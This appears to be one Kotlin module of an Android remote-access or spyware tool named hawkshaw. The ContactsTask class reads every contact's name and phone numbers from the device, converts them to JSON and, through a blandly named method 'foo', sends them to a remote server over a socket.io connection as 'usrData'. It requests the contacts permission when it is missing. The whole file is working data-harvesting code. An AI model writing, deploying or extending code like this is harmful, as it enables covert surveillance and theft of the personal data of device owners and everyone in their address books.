package me.hawkshaw.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import android.support.v4.content.ContextCompat
import com.google.gson.Gson
import io.socket.client.Socket
import me.hawkshaw.models.Contact
import org.json.JSONObject
import java.util.HashMap
import kotlin.collections.ArrayList


class ContactsTask(private val ctx: Context, private val socket: Socket) : BaseTask(ctx) {

    private fun getContactList(): ArrayList<Contact> {

        val contacts = ArrayList<Contact>()
        val cur = ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME)

        while (cur.moveToNext()) {

            val phoneNos = ArrayList<String>()
            val id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))
            val name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))

            if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                val pCur = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf<String>(id), null)
                while (pCur.moveToNext()) {
                    val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    phoneNos.add(phoneNo)
                }
                pCur.close()
            }
            val contact = Contact(id, name, phoneNos)
            contacts.add(contact)
        }

        cur?.close()
        return contacts
    }

    private fun getJSON(list: ArrayList<Contact>): String {
        return Gson().toJson(list)
    }

    private fun getContacts(): String {
        return getJSON(getContactList())
    }

    override fun run() {
        super.run()
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)
            foo(getContacts())
        else requestPermissions()
    }

    private fun foo(str:String){
        val data: HashMap<String, String> = HashMap()
        data.put("contacts", str)
        data.put("dataType", "contacts")

        socket.emit("usrData", JSONObject(data))
    }
}
